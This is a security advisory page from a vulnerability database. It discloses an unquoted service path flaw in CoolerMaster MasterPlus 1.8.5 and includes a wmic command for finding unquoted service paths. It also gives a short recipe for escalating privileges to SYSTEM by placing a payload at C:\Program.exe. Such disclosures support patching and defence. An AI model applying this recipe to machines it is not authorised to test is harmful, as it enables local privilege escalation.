---
title: CoolerMaster MasterPlus 1.8.5 Unquoted Service Path
url: https://cxsecurity.com/issue/WLB-2023040003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-03
fetch_date: 2025-10-04T11:29:16.450793
---

# CoolerMaster MasterPlus 1.8.5 Unquoted Service Path

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CoolerMaster MasterPlus 1.8.5 Unquoted Service Path** **2023.04.02**  Credit:  **[Damian Semon Jr](https://cxsecurity.com/author/Damian%2BSemon%2BJr/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: CoolerMaster MasterPlus 1.8.5 - 'MPService' Unquoted Service Path
# Date: 11/17/2022
# Exploit Author: Damian Semon Jr (Blue Team Alpha)
# Version: 1.8.5
# Vendor Homepage: https://masterplus.coolermaster.com/
# Software Link: https://masterplus.coolermaster.com/
# Tested on: Windows 10 64x
# Step to discover the unquoted service path:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
CoolerMaster MasterPlus Technology Service MPService C:\Program Files (x86)\CoolerMaster\MasterPlus\MPService.exe Auto
# Info on the service:
C:\>sc qc MPService
[SC] QueryServiceConfig SUCCESS
SERVICE\_NAME: MPService
TYPE : 10 WIN32\_OWN\_PROCESS
START\_TYPE : 2 AUTO\_START
ERROR\_CONTROL : 1 NORMAL
BINARY\_PATH\_NAME : C:\Program Files (x86)\CoolerMaster\MasterPlus\MPService.exe
LOAD\_ORDER\_GROUP :
TAG : 0
DISPLAY\_NAME : CoolerMaster MasterPlus Technology Service
DEPENDENCIES :
SERVICE\_START\_NAME : LocalSystem
#Exploit:
A successful exploit of this vulnerability could allow a threat actor to execute code during startup or reboot with System privileges. Drop payload "Program.exe" in C:\ and restart service or computer to trigger.
Ex: (C:\Program.exe)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top